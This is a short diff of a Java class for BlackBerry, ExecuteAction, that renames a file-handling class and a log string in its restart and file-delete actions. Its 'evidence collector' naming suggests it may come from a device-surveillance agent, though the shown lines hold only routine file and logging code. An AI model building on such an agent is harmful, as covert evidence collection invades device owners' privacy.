@@ -25,7 +25,7 @@ import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
-import blackberry.fs.AutoFlashFile;
+import blackberry.fs.AutoFile;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -114,7 +114,7 @@ public final class ExecuteAction extends SubAction {
         debug.trace("executeRestart");
         //#endif
         Task.getInstance().restart();
-        Evidence.info("ActRestart");
+        Evidence.info("ActexecuteRestart");
     }
 
     private void executeCleanup(Vector params) {
@@ -148,7 +148,7 @@ public final class ExecuteAction extends SubAction {
             //#ifdef DEBUG
             debug.trace("executeDelete argument: " + filename);
             //#endif
-            AutoFlashFile file = new AutoFlashFile(filename);
+            AutoFile file = new AutoFile(filename);
             if (file.exists()) {
                 //#ifdef DEBUG
                 debug.info("executeDelete deleting: " + filename);
